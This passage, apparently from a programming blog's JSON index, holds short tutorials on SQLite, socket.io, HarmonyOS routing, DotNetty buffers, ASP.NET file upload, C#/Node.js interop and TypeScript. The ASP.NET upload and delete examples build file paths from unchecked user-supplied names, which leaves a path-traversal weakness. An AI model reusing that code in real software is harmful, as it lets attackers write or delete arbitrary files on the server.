查询数据cursor.execute(&quot;SELECT * FROM users&quot;)rows = cursor.fetchall()for row in rows: print(row)# 6. 更新数据cursor.execute(&quot;UPDATE users SET age = ? WHERE name = ?&quot;, (31, &#x27;py1&#x27;))conn.commit()# 7. 删除数据cursor.execute(&quot;DELETE FROM users WHERE name = ?&quot;, (&#x27;py2&#x27;,))conn.commit()# 8. 关闭游标和连接cursor.close()conn.close() End","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[],"author":"mu"},{"title":"socket.io","slug":"Nodejs-socketio","date":"2024-05-26T15:01:07.000Z","updated":"2024-06-01T03:08:18.000Z","comments":true,"path":"2024/05/26/Nodejs-socketio/","permalink":"https://banjinmei.github.io/2024/05/26/Nodejs-socketio/","excerpt":"","text":"server 1npm install express 1npm install socket.io 12345678910111213141516171819202122232425const express = require(&#x27;express&#x27;);const http = require(&#x27;http&#x27;);const socketIO = require(&#x27;socket.io&#x27;);const app = express();const server = http.createServer(app);const io = socketIO(server);io.on(&#x27;connection&#x27;, (socket) =&gt; &#123; console.log(&#x27;User connected&#x27;); socket.on(&#x27;chat message&#x27;, (msg) =&gt; &#123; console.log(&#x27;message: &#x27; + msg); io.emit(&#x27;chat message&#x27;, msg); // to all &#125;); socket.on(&#x27;disconnect&#x27;, () =&gt; &#123; console.log(&#x27;User disconnected&#x27;); &#125;);&#125;);server.listen(24525, () =&gt; &#123; console.log(&#x27;Node Server is running on port 24525&#x27;);&#125;); dockerdockerfile 12345678910111213FROM node:16-alpineWORKDIR /usr/src/appCOPY package*.json ./RUN npm ci --only=productionCOPY . .EXPOSE 24525CMD [&quot;node&quot;, &quot;skio.js&quot;] 12345678docker build -t nodeskio .docker run -p 24525:24525 -d nodeskio##login push#docker login#docker push your-image-name client 1npm install socket.io-client 12345678910111213141516171819202122232425262728293031323334const io = require(&#x27;socket.io-client&#x27;);const readline = require(&#x27;readline&#x27;);const rl = readline.createInterface(&#123; input: process.stdin, output: process.stdout&#125;);const socket = io.connect(&#x27;http://localhost:24525&#x27;);socket.on(&#x27;connect&#x27;, () =&gt; &#123; console.log(&#x27;Connected to server&#x27;);&#125;);// 监听从服务器接收到的消息socket.on(&#x27;chat message&#x27;, (msg) =&gt; &#123; console.log(&#x27;Message from server:&#x27;, msg);&#125;);// 处理用户输入并发送到服务器rl.on(&#x27;line&#x27;, (input) =&gt; &#123; if (input.toLowerCase() === &#x27;exit&#x27;) &#123; console.log(&#x27;Exiting...&#x27;); rl.close(); process.exit(0); &#125; else &#123; socket.emit(&#x27;chat message&#x27;, input); &#125;&#125;);// 处理关闭事件rl.on(&#x27;close&#x27;, () =&gt; &#123; socket.disconnect(); console.log(&#x27;Connection closed.&#x27;);&#125;); 1npm run","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[],"author":"mu"},{"title":"HarmonyOS Interface Router ArkTS ArkUI","slug":"HarmonyOS-Router","date":"2024-05-23T13:49:44.000Z","updated":"2024-12-15T05:10:21.283Z","comments":true,"path":"2024/05/23/HarmonyOS-Router/","permalink":"https://banjinmei.github.io/2024/05/23/HarmonyOS-Router/","excerpt":"","text":"11 🎬️create12345678910111213141516@Componentexport default struct TitleBar &#123; build()&#123; Row()&#123; Text(&#x27;transition&#x27;) .fontSize(&#x27;30fp&#x27;) .fontColor(Color.White) &#125; .width(&#x27;100%&#x27;) .height(&#x27;8%&#x27;) .backgroundColor(&#x27;#4169E1&#x27;) .padding(&#123;left:10&#125;) &#125;&#125; 🎞️interface1234export interface IList&#123; title:string; url :string;&#125; 123456789101112131415161718@State listData:IList[]=[ // @State listData:Array&lt;IList&gt;=[ &#123; title:&#x27;in&#x27;, url:&#x27;pages/home1&#x27; &#125;, &#123; title:&#x27;scale&#x27;, url:&#x27;pages/home2&#x27; &#125;, &#123; title:&#x27;small&#x27;, url:&#x27;pages/home3&#x27; &#125;, &#123; title:&#x27;in&#x27;, url:&#x27;&#x27; &#125;] 💡foreach12345678910ForEach(this.listData,( item: IList,index?:number)=&gt;&#123; //listitem Button(&#123;type:ButtonType.Capsule&#125;)&#123; Text(item.title) .fontSize(&#x27;35fp&#x27;) .fontColor(Color.White) &#125; //... &#125;) 🔦router1import router from &#x27;@ohos.router&#x27; 📼mainpage1&quot;pages/home1&quot; 📹️onclick1234.onClick(()=&gt;&#123; //router router.pushUrl(&#123;url:item.url&#125;) &#125;) 📺️setInterval123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354//home1 page1import router from &#x27;@ohos.router&#x27;@Entry@Componentstruct Index &#123; @State TOTAL_TIME:number = 6;//s @State FIRST_CT:number =3;//s aboutToAppear()&#123; //timer let timer= setInterval(()=&gt;&#123; this.TOTAL_TIME--; if(this.TOTAL_TIME===0)&#123; //end router.pushUrl(&#123; url:&quot;pages/Index&quot; &#125;) clearInterval(timer); &#125; &#125;,1000) &#125; build() &#123; Column() &#123; Row() &#123; if(this.TOTAL_TIME&gt;this.FIRST_CT)&#123; //1 Image($r(&#x27;app.media.t2&#x27;)) .objectFit(ImageFit.Contain) &#125;else if(this.TOTAL_TIME&lt;this.FIRST_CT) &#123; //2 Image($r(&#x27;app.media.bc&#x27;)) .objectFit(ImageFit.Contain) .width(&#x27;30%&#x27;) Text(&#x27; - m - &#x27;) .fontSize(&#x27;30fp&#x27;) &#125; &#125; .width(&#x27;100%&#x27;) .height(&#x27;100%&#x27;) .justifyContent(FlexAlign.Center) // Text(&#x27;in&#x27;) // .fontSize(&#x27;50fp&#x27;) &#125; .width(&#x27;100%&#x27;) &#125;&#125; ​ 📽️TransitionEnter scale1234567891011121314151617181920//home2 page2 @State scale1: number = 1 @State opacity1: number = 1//... Column().scale(&#123; x: this.scale1 &#125;).opacity(this.opacity1)//... pageTransition() &#123; PageTransitionEnter(&#123; duration: 1200, curve: Curve.Linear &#125;) .onEnter((type: RouteType, progress: number) =&gt; &#123; this.scale1 = 1 this.opacity1 = progress &#125;) // onEnter (0% -- 100%) PageTransitionExit(&#123; duration: 1500, curve: Curve.Ease &#125;) .onExit((type: RouteType, progress: number) =&gt; &#123; this.scale1 = 1 - progress this.opacity1 = 1 &#125;) // onExit (0% -- 100%) &#125; ​ 🎥SlideEffect.Left1234567pageTransition() &#123; PageTransitionEnter(&#123; duration: 1200 &#125;) .slide(SlideEffect.Left) PageTransitionExit(&#123; delay: 100 &#125;) .translate(&#123; x: 100.0, y: 100.0 &#125;) .opacity(0)&#125; ​","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"HarmonyOS","slug":"HarmonyOS","permalink":"https://banjinmei.github.io/tags/HarmonyOS/"}],"author":"mu"},{"title":"DotNetty ByteBuffer","slug":"DotNetty-ByteBuffer","date":"2024-05-23T13:47:10.000Z","updated":"2024-06-01T02:27:38.000Z","comments":true,"path":"2024/05/23/DotNetty-ByteBuffer/","permalink":"https://banjinmei.github.io/2024/05/23/DotNetty-ByteBuffer/","excerpt":"","text":"DotNetty是一个高性能的.NET网络通信框架，基于Netty，支持TCP、UDP、HTTP、WebSocket等协议。适用于高并发、低延迟场景，如实时通信、游戏服务器、IoT应用及大型分布式系统，通过异步I&#x2F;O、零拷贝等技术提升性能，具备易用性、可扩展性。架构上，围绕Channel、EventLoop、ChannelPipeline、ChannelHandlerContext设计，包含Transport、Codec、Handler等模块，简化网络编程，加速数据传输处理。 ByteBuffer 用于高效处理字节数据，固定容量，通过allocate或wrap创建。涉及position和limit追踪读写位置，提供get&#x2F;put等读写方法，flip切换读写模式，clear清空缓冲区，compact移动数据并准备下一轮读写，适用于高性能IO与网络通信。. 优点零拷贝通过复合缓冲区实现。动态容量增长。无需flip切换读写模式。分离读写索引。内置引用计数。支持缓冲区池化。优化网络通信中的字节处理。 结构readerIndex 读取，随读增。writerIndex 写入，随写增。capacity容量。 ByteBuffer属性readIndex：下一个读位writeIndex：下一个写位置capacity：容量0：缓冲区开始位置 已经读取的区域：[0,readerindex)可读取的区域：[readerindex,writerIndex)可写的区域: [writerIndex,capacity)读写独立索引，操作命名区分（read&#x2F;write自动进，get&#x2F;set不影响索引）。支持设定最大容量，超限写操作将抛异常，默认上限Integer.MAX_VALUE。readerIndex writerIndex 本质为灵活高效字节容器 堆缓冲区最常用的 ByteBuffer 模式是将数据存储在堆空间中。这种模式被称为支撑数组（backing array），它能在没有使用池化的情况下提供快速的分配和释放。可以由 hasArray() 来判断检查 ByteBuffer是否由数组支撑。如果不是，则这是一个直接缓冲区。 直接缓冲区直接缓冲区是另外一种 ByteBuffer 模式。直接缓冲区的主要缺点是，相对于基于堆的缓冲区，它们的分配和释放都较为昂贵。 复合缓冲区复合缓冲区 CompositeByteBuf，它为多个 ByteBuffer提供一个聚合视图。比如 HTTP 协议， 分为消息头和消息体，这两部分可能由应用程序的不同模块产生，各有各的 ByteBuffer，将会在消息被发送的时候组装为一个 ByteBuffer，此时可以将这两个 ByteBuffer聚合为一个 CompositeByteBuf，然后使用统一和通用的 ByteBuffer API 来操作。 如何在的程序中获得 ByteBuf 的实例，并使用它呢？Netty 提供了两种方式 ByteBufAllocator 接口ByteBufAllocator 分配任意类型的 ByteBuffer 实例。 buffer(): 基于堆&#x2F;直接内存ByteBuffer。heapBuffer(): 仅堆内存。directBuffer(): 仅直接内存。compositeBuffer(): 可组合多个缓冲区，支持堆&#x2F;直接内存。ioBuffer(): 适配I&#x2F;O操作，优先直接内存(需Unsafe支持)。ByteBufAllocator：Channel ChannelHandlerContext Unpooled 缓冲区 Unpooled工具类助创ByteBuffer buffer()：堆内存ByteBuffer directBuffer()：直接内存ByteBuffer wrappedBuffer()：包装数据的ByteBuffer copiedBuffer()：复制数据的ByteBuffer 适用范围广泛，不仅限于Netty网络项目。 1IByteBuffer byteBuf = Unpooled.CopiedBuffer(&quot;hello,world!&quot;, Encoding.UTF8); ByteBuf访问&#x2F;读写索引从0开始至capacity()-1。随机访问（get&#x2F;set）不改索引，需显式调用readerIndex()&#x2F;writerIndex()移动。顺序访问分两类：get&#x2F;set：固定索引，读写数据不移位。read&#x2F;write：自动调整readerIndex&#x2F;writerIndex。 isReadable() 如果至少有一个字节可供读取，则返回 trueisWritable() 如果至少有一个字节可被写入，则返回 truereadableBytes() 返回可被读取的字节数writableBytes() 返回可被写入的字节数capacity() 返回 ByteBuffer 可容纳的字节数。在此之后，它会尝试再次扩展直到达到maxCapacity()maxCapacity() 返回 ByteBuffer 可以容纳的最大字节数hasArray() 如果 ByteBuffer 由一个字节数组支撑，则返回 truearray() 如果 ByteBuffer 由一个字节数组支撑则返回该数组 可丢弃字节读操作后，字节积累在”可丢弃”段，始于readerIndex。discardReadBytes()释放已读字节，回收空间，可能导致之前数据移动。此操作可能涉及内存复制，谨慎使用。 可读字节：存储实际数据，新缓冲区默认从readerIndex&#x3D;0开始。可写字节：空白区域待写入，新缓冲区writerIndex初设0，写操作后自动递增。 资源释放处理Netty入站ByteBuffer ，可选自动释放：用SimpleChannelInboundHandler，或在channelRead()末手动调用ReferenceCountUtil.release(msg)确保资源管理。 1234567891011121314151617181920212223242526272829303132333435363738394041424344using DotNetty.Buffers;using DotNetty.Transport.Channels;public class CommanChannelInboundHandler : SimpleChannelInboundHandler&lt;object&gt;&#123; protected override void ChannelRead(IChannelHandlerContext context, object message) &#123; bool shouldRelease = true; try &#123; if (IsMessageAcceptable(message)) &#123; ChannelRead0(context, message); &#125; else &#123; shouldRelease = false; context.FireChannelRead(message); &#125; &#125; finally &#123; if (AutoRelease &amp;&amp; shouldRelease) &#123; ResourceUtil.Release(message); &#125; &#125; &#125; private bool IsMessageAcceptable(object msg) &#123; return msg is IByteBuffer; // 假设只处理IByteBuffer类型的消息 &#125; protected virtual void ChannelRead0(IChannelHandlerContext context, object message) &#123; //IByteBuffer ... &#125; private bool AutoRelease &#123; get; set; &#125; = true;&#125; 对于出站请求，不管 ByteBuffer 是否由我们的业务创建的，当调用了 write 或者 writeAndFlush 方法后，Netty 会自动替我们释放，不需要我们业务代码自行释放。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576// 创建ByteBuf对象，初始容量为1，内部动态扩容以容纳更多数据IByteBuffer byteBuf = Unpooled.Buffer(1);Console.WriteLine(&quot;byteBuf=&quot; + byteBuf);for (int i = 0; i &lt; 8; i++)&#123; byteBuf.WriteByte(i);&#125;Console.WriteLine(&quot;byteBuf=&quot; + byteBuf);for (int i = 0; i &lt; 5; i++)&#123; Console.WriteLine(byteBuf.GetByte(i));&#125;Console.WriteLine(&quot;byteBuf=&quot; + byteBuf);for (int i = 0; i &lt; 5; i++)&#123; Console.WriteLine(byteBuf.ReadByte());&#125;Console.WriteLine(&quot;byteBuf=&quot; + byteBuf);//byteBuf2// 使用Unpooled工具类创建ByteBuf，内容为&quot;hello,world!&quot;IByteBuffer byteBuf2 = Unpooled.CopiedBuffer(&quot;hello,world!&quot;, Encoding.UTF8); // Unpooled.CopiedBuffer(&quot;hello,world!&quot;, Encoding.UTF8);// 使用相关的方法if (byteBuf2.HasArray) // if (byteBuf2.HasArray)&#123; byte[] content = byteBuf2.Array; // 将content转成字符串 Console.WriteLine(Encoding.UTF8.GetString(content)); Console.WriteLine(&quot;byteBuf2=&quot; + byteBuf2); Console.WriteLine(byteBuf2.GetByte(0)); // 获取数组0这个位置的字符&#x27;h&#x27;的ASCII码，h=104 int len = byteBuf2.ReadableBytes; // 可读的字节数 12 Console.WriteLine(&quot;len=&quot; + len); // 使用for取出各个字节并转换为对应的字符打印 for (int i = 0; i &lt; len; i++) &#123; Console.WriteLine((char)byteBuf2.GetByte(i)); &#125; // 范围读取 Console.WriteLine(byteBuf2.GetCharSequence(0, 6, Encoding.UTF8)); Console.WriteLine(byteBuf2.GetCharSequence(6, 6, Encoding.UTF8));&#125;//byteBuf3 WrappedBuffervar str1 = Encoding.UTF8.GetBytes(&quot;hello,world!&quot;);var byteBuf3 = Unpooled.WrappedBuffer(str1);if (byteBuf3.HasArray) // if (byteBuf2.HasArray)&#123; byte[] content = byteBuf3.Array; // 将content转成字符串 Console.WriteLine(Encoding.UTF8.GetString(content)); Console.WriteLine(&quot;byteBuf3=&quot; + byteBuf3); Console.WriteLine(byteBuf3.GetByte(0)); // 获取数组0这个位置的字符&#x27;h&#x27;的ASCII码，h=104 int len = byteBuf3.ReadableBytes; // 可读的字节数 12 Console.WriteLine(&quot;len=&quot; + len); // 使用for取出各个字节并转换为对应的字符打印 for (int i = 0; i &lt; len; i++) &#123; Console.WriteLine((char)byteBuf3.GetByte(i)); &#125; // 范围读取 Console.WriteLine(byteBuf3.GetCharSequence(0, 6, Encoding.UTF8)); Console.WriteLine(byteBuf3.GetCharSequence(6, 6, Encoding.UTF8));&#125; 结果得出 get操作 readerIndex 不变，read操作使其移动。 End","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[],"author":"mu"},{"title":".NET FileUpload","slug":"NET-Fileupload","date":"2024-05-20T13:14:38.000Z","updated":"2024-08-29T14:23:46.000Z","comments":true,"path":"2024/05/20/NET-Fileupload/","permalink":"https://banjinmei.github.io/2024/05/20/NET-Fileupload/","excerpt":"","text":"VS2022 .NET8 💾基础上传示例view 12345678910111213@&#123; ViewData[&quot;Title&quot;] = &quot;File Upload&quot;;&#125;&lt;h1&gt;@ViewData[&quot;Title&quot;]&lt;/h1&gt;&lt;form method=&quot;post&quot; enctype=&quot;multipart/form-data&quot; action=&quot;/Home/UploadFile&quot;&gt; &lt;div class=&quot;form-group&quot;&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; class=&quot;form-control&quot; /&gt; &lt;/div&gt; &lt;button type=&quot;submit&quot; class=&quot;btn btn-primary&quot;&gt;Upload&lt;/button&gt;&lt;/form&gt; controller 1234567891011121314151617181920212223242526[HttpPost]public async Task&lt;IActionResult&gt; UploadFile()&#123; var file = Request.Form.Files[0]; if (file != null &amp;&amp; file.Length &gt; 0) &#123; var uploads = Path.Combine(Directory.GetCurrentDirectory(), &quot;wwwroot&quot;, &quot;up&quot;); if (!Directory.Exists(uploads)) &#123; Directory.CreateDirectory(uploads); &#125; var filePath = Path.Combine(uploads, file.FileName); using (var fileStream = new FileStream(filePath, FileMode.Create)) &#123; await file.CopyToAsync(fileStream); &#125; // SAVE TO DB return RedirectToAction(&quot;Index&quot;); &#125; return View();&#125; 1app.UseStaticFiles(); run 📀优化 限制文件大小上传文件夹如 img &#x3D;&gt; img rar &#x3D;&gt; file限制文件大小 12345678910111213141516171819202122232425262728// 根据文件类型选择上传的文件夹string fileExtension = Path.GetExtension(file.FileName).ToLower();switch (fileExtension)&#123; case &quot;.jpg&quot;: case &quot;.png&quot;: uploadFolder = Path.Combine(&quot;wwwroot&quot;, &quot;img&quot;); break; case &quot;.mp4&quot;: // 检查视频大小是否超过限制 if (file.Length &gt; 20 * 1024 * 1024) // 20MB &#123; ModelState.AddModelError(&quot;File&quot;, &quot;Video file size should not exceed 20MB.&quot;); return View(&quot;Index&quot;, file); &#125; uploadFolder = Path.Combine(&quot;wwwroot&quot;, &quot;vd&quot;); break; case &quot;.m4a&quot;: uploadFolder = Path.Combine(&quot;wwwroot&quot;, &quot;sound&quot;); break; case &quot;.rar&quot;: uploadFolder = Path.Combine(&quot;wwwroot&quot;, &quot;file&quot;); break; default: ModelState.AddModelError(&quot;File&quot;, &quot;Unsupported file format.&quot;); return View(&quot;Index&quot;, file);&#125; 🪫删除view 1234567891011121314151617181920212223242526272829303132333435@model IEnumerable&lt;string&gt;&lt;h1&gt;Uploaded Files&lt;/h1&gt;@if (Model.Any())&#123; &lt;table class=&quot;table&quot;&gt; &lt;thead&gt; &lt;tr&gt; &lt;th&gt;File Name&lt;/th&gt; &lt;th&gt;Action&lt;/th&gt; &lt;/tr&gt; &lt;/thead&gt; &lt;tbody&gt; @foreach (var fileName in Model) &#123; &lt;tr&gt; &lt;td&gt;@fileName&lt;/td&gt; &lt;td&gt; &lt;form method=&quot;post&quot; asp-action=&quot;DeleteFile&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;fileName&quot; value=&quot;@fileName&quot; /&gt; &lt;button type=&quot;submit&quot; class=&quot;btn btn-danger&quot;&gt;Delete&lt;/button&gt; &lt;/form&gt; &lt;/td&gt; &lt;/tr&gt; &#125; &lt;/tbody&gt; &lt;/table&gt;&#125;else&#123; &lt;p&gt;No files uploaded yet.&lt;/p&gt;&#125; controller 1234567891011[HttpPost]public IActionResult DeleteFile(string fileName)&#123; var uploadFolder = Path.Combine(Directory.GetCurrentDirectory(), &quot;wwwroot&quot;, &quot;img&quot;); var filePath = Path.Combine(uploadFolder, fileName); if (System.IO.File.Exists(filePath)) &#123; System.IO.File.Delete(filePath); &#125; return RedirectToAction(&quot;Files&quot;);&#125; 💿️重命名123456string fileName = $&quot;&#123;DateTime.Now:yyyyMMddHHmmssfff&#125;&#123;new Random().Next(1000, 9999)&#125;&#123;fileExtension&#125;&quot;;var filePath = Path.Combine(uploads, fileName);using (var fileStream = new FileStream(filePath, FileMode.Create))&#123; await file.CopyToAsync(fileStream);&#125; 💽多文件上传controller 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970[ApiController][Route(&quot;[controller]&quot;)]public class FileUploadController : ControllerBase&#123; private readonly string UploadsDirectory = Path.Combine(Directory.GetCurrentDirectory(), &quot;uploads&quot;); public FileUploadController() &#123; // 创建上传文件夹（如果不存在） if (!Directory.Exists(UploadsDirectory)) &#123; Directory.CreateDirectory(UploadsDirectory); &#125; &#125; [HttpPost] [Route(&quot;upload&quot;)] public async Task&lt;IActionResult&gt; Upload(IFormFile[] files) &#123; if (files == null || files.Length == 0) &#123; return BadRequest(&quot;No files uploaded.&quot;); &#125; foreach (var file in files) &#123; if (file.Length == 0) &#123; return BadRequest($&quot;File &#123;file.FileName&#125; is empty.&quot;); &#125; // 根据文件类型选择上传的文件夹 string uploadFolder = GetUploadFolder(file.FileName); // 重命名文件为指定格式 string fileName = $&quot;&#123;DateTime.Now:yyyyMMddHHmmssfff&#125;_&#123;Guid.NewGuid()&#125;&#123;Path.GetExtension(file.FileName)&#125;&quot;; string filePath = Path.Combine(UploadsDirectory, uploadFolder, fileName); using (var stream = new FileStream(filePath, FileMode.Create)) &#123; await file.CopyToAsync(stream); &#125; // 在这里可以处理上传文件的逻辑，比如保存文件信息到数据库等 &#125; return Ok(&quot;Files uploaded successfully.&quot;); &#125; private string GetUploadFolder(string fileName) &#123; string fileExtension = Path.GetExtension(fileName).ToLower(); switch (fileExtension) &#123; case &quot;.jpg&quot;: case &quot;.png&quot;: return &quot;img&quot;; case &quot;.mp4&quot;: return &quot;vd&quot;; case &quot;.m4a&quot;: return &quot;sound&quot;; case &quot;.rar&quot;: return &quot;file&quot;; default: throw new NotSupportedException($&quot;Unsupported file format for &#123;fileName&#125;.&quot;); &#125; &#125;&#125; view 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748@&#123; ViewBag.Title = &quot;File Upload&quot;;&#125;&lt;h2&gt;File Upload2&lt;/h2&gt;&lt;form id=&quot;uploadForm&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;file&quot; id=&quot;fileInput&quot; multiple&gt; &lt;input type=&quot;button&quot; value=&quot;Upload&quot; onclick=&quot;uploadFiles()&quot; /&gt;&lt;/form&gt;&lt;div id=&quot;message&quot;&gt;&lt;/div&gt;@section scripts &#123; &lt;script&gt; function uploadFiles() &#123; var files = document.getElementById(&#x27;fileInput&#x27;).files; if (files.length === 0) &#123; showMessage(&#x27;No files selected.&#x27;); return; &#125; var formData = new FormData(); for (var i = 0; i &lt; files.length; i++) &#123; formData.append(&#x27;files&#x27;, files[i]); &#125; $.ajax(&#123; url: &#x27;@Url.Action(&quot;Upload&quot;, &quot;FileUpload&quot;)&#x27;, type: &#x27;POST&#x27;, data: formData, processData: false, contentType: false, success: function (response) &#123; showMessage(response); &#125;, error: function (xhr, status, error) &#123; showMessage(&#x27;Upload failed: &#x27; + error); &#125; &#125;); &#125; function showMessage(message) &#123; $(&#x27;#message&#x27;).text(message); &#125; &lt;/script&gt;&#125;","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":".net","slug":"net","permalink":"https://banjinmei.github.io/tags/net/"}],"author":"mu"},{"title":"c# run nodejs","slug":"nodejs-run-c","date":"2024-05-20T13:13:27.000Z","updated":"2024-08-29T14:23:46.000Z","comments":true,"path":"2024/05/20/nodejs-run-c/","permalink":"https://banjinmei.github.io/2024/05/20/nodejs-run-c/","excerpt":"","text":"在C#中调用Node.js时，一种常见的方法是使用进程间通信（Inter-Process Communication，IPC），例如使用子进程。可以使用C#中的Process类来启动Node.js进程，并通过标准输入输出与其进行通信。 C# run nodejs12345678910// n.js// 监听来自标准输入的消息process.stdin.on(&#x27;data&#x27;, function (data) &#123; // 收到消息后，在控制台输出并回复消息 console.log(&quot;Message from C#: &quot; + data.toString()); process.stdout.write(&quot;Hello from Node.js!&quot;);&#125;); 12345678910111213141516171819202122232425262728293031323334353637383940ProcessStartInfo startInfo = new ProcessStartInfo();startInfo.FileName = &quot;node&quot;; // Node.js可执行文件路径，如果已在系统路径中，则不需要提供完整路径startInfo.Arguments = &quot;n.js&quot;; // 执行的Node.js脚本文件路径startInfo.UseShellExecute = false;startInfo.RedirectStandardInput = true;startInfo.RedirectStandardOutput = true;Process nodeProcess = new Process();nodeProcess.StartInfo = startInfo;// 启动进程nodeProcess.Start();// 与Node.js进程进行通信using (var writer = nodeProcess.StandardInput)&#123; if (writer.BaseStream.CanWrite) &#123; // 向Node.js进程发送消息 writer.WriteLine(&quot;Hello from C#!&quot;); &#125;&#125;// 读取Node.js进程的输出using (var reader = nodeProcess.StandardOutput)&#123; if (reader.BaseStream.CanRead) &#123; // 从Node.js进程读取响应 string response = reader.ReadLine(); Console.WriteLine(&quot;Response from Node.js: &quot; + response); &#125;&#125;Console.Read();// 等待Node.js进程结束nodeProcess.WaitForExit();nodeProcess.Close(); Socketserver1234567891011121314151617181920212223242526272829const net = require(&#x27;net&#x27;);// 创建一个服务器实例const server = net.createServer((socket) =&gt; &#123; // 连接建立时触发 console.log(&#x27;Client connected.&#x27;); // 监听客户端发送的数据 socket.on(&#x27;data&#x27;, (data) =&gt; &#123; console.log(&#x27;Received from client: &#x27; + data.toString()); // 向客户端发送响应数据 socket.write(&#x27;Hello from Node.js!&#x27; + data.toString()); &#125;); // 监听连接断开事件 socket.on(&#x27;end&#x27;, () =&gt; &#123; console.log(&#x27;Client disconnected.&#x27;); &#125;);&#125;);// 监听指定端口const port = 24520;server.listen(port, () =&gt; &#123; console.log(&#x27;Node Server listening on port &#x27; + port);&#125;); 1234567891011121314151617181920212223242526// 启动 Node.js 服务器的 Node.js 脚本文件路径string nodeScriptPath = &quot;n.js&quot;;// 启动 Node.js 进程ProcessStartInfo startInfo = new ProcessStartInfo();startInfo.FileName = &quot;node&quot;; // Node.js 可执行文件路径，如果已在系统路径中，则不需要提供完整路径startInfo.Arguments = nodeScriptPath; // Node.js 脚本文件路径startInfo.UseShellExecute = false;startInfo.RedirectStandardOutput = true;Process nodeProcess = new Process();nodeProcess.StartInfo = startInfo;// Node.js 服务器输出的事件处理函数nodeProcess.OutputDataReceived += (sender, e) =&gt;&#123; Console.WriteLine(e.Data); // 输出 Node.js 服务器的输出信息&#125;;// 启动进程nodeProcess.Start();nodeProcess.BeginOutputReadLine(); // 开始异步读取 Node.js 服务器的输出// 等待 Node.js 进程结束nodeProcess.WaitForExit();nodeProcess.Close(); run client1234567891011121314151617181920212223// 连接到 Node.js 服务器的地址和端口string serverAddress = &quot;127.0.0.1&quot;; // 本地地址int serverPort = 24520; // Node.js 服务器端口// 创建 TcpClient 实例using (TcpClient client = new TcpClient(serverAddress, serverPort))&#123; // 获取用于向服务器发送数据的网络流 using (NetworkStream stream = client.GetStream()) &#123; // 发送数据到服务器 string message = &quot;hi from C#!&quot;; byte[] data = Encoding.ASCII.GetBytes(message); stream.Write(data, 0, data.Length); Console.WriteLine(&quot;Sent: &quot; + message); // 读取服务器的响应 byte[] buffer = new byte[1024]; int bytesRead = stream.Read(buffer, 0, buffer.Length); string response = Encoding.ASCII.GetString(buffer, 0, bytesRead); Console.WriteLine(&quot;Received: &quot; + response); &#125;&#125; run nodejs run c#Node.js 使用 child_process.exec() 函数执行 c# exe 1Console.WriteLine(&quot;hi c# &quot;); 123456789101112131415//runc.jsconst &#123; exec &#125; = require(&#x27;child_process&#x27;);// 执行 hello.exeexec(&#x27;ConNode.exe&#x27;, (error, stdout, stderr) =&gt; &#123; if (error) &#123; console.error(`执行错误: $&#123;error.message&#125;`); return; &#125; if (stderr) &#123; console.error(`执行错误: $&#123;stderr&#125;`); return; &#125; console.log(`C# 输出: $&#123;stdout&#125;`);&#125;); run 1node runc.js","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":".net","slug":"net","permalink":"https://banjinmei.github.io/tags/net/"},{"name":"c#","slug":"c","permalink":"https://banjinmei.github.io/tags/c/"}],"author":"mu"},{"title":"Typescript","slug":"Typescript-ts","date":"2024-05-19T16:07:45.000Z","updated":"2024-06-01T03:08:40.000Z","comments":true,"path":"2024/05/20/Typescript-ts/","permalink":"https://banjinmei.github.io/2024/05/20/Typescript-ts/","excerpt":"","text":"typescript ≈ javascript plus 🔗setup1npm install typescript -g 1tsc -version 1npm install ts-node -g 🖌️hello world12let str = &quot;hi&quot;console.log(str); 1ts-node t.ts 🖋️datatype1234567let a1 :string =&#x27;abc&#x27;let a2:number = 2let a3 :boolean =truelet nu:null =nulllet un:undefined = undefinedlet a4:string|null = nulllet a5:1|2|3 = 2 any12345let a:anya= 1a=&quot;1&quot;a=true strong type 123let a:string = &quot;123&quot;a=1 Err 1234567891011let a:unknowna= 1a=&quot;1&quot;a=truelet b :String if(typeof a ==&quot;string&quot;)&#123; b=a &#125; enum 枚举123enum Color &#123; RED,BLUE,BLACK&#125;let color = Color.BLACK; //Color[2]console.log(color); 1ts-node t.ts or to js 1tsc t.ts to see t.js Array12345let arr :number[] = [1,2,3]let arr2 :Array&lt;string&gt; = [&#x27;a&#x27;,&#x27;b&#x27;] 元组1234let arr:[String,number,boolean] =[&quot;123&quot;,1,true]let a1 :[number,string,number?] = [1,&quot;11&quot;] 🖊️function1234567function myFn(a:number,b:string,c?:boolean,...rest:number[]) :number&#123; return 100&#125;const f = myFn(10,&#x27;123&#x27;,true,1,2,3) ✒️interface123456789101112interface Obj&#123; name :string, age:number&#125;const obj:Obj=&#123; name:&#x27;a&#x27;, age:15&#125; 📏type12345let a: String |number = 10 type myname = string |numberlet b:myname = 10let b2:myname = &quot;10&quot; 📐T 泛型1234567function myFn&lt;T&gt;(a:T,b:T):T[]&#123; return [a,b]&#125;myFn&lt;number&gt;(1,2)myFn(&#x27;a&#x27;,&#x27;b&#x27;) 📎extends123456789101112131415161718interface Parent&#123; p1 :string p2:number &#125;interface Child extends Parent&#123; p3:string&#125;const v1 :Child=&#123; p1 :&quot;123&quot;, p2:1, p3:&quot;12&quot;&#125; 🔧class12345678910111213141516171819202122232425262728293031323334353637class Article&#123; public title:string con:string temp1?:string tempnum= 100 private temp2 ?:string protected temp3?:string static a1 :string static readonly a2 :string =&#x27;a2st&#x27; constructor (title:string,con:string) &#123; this.title=title this.con=con &#125;&#125;const a1 =new Article(&#x27;t1&#x27;,&#x27;con1&#x27;)class B 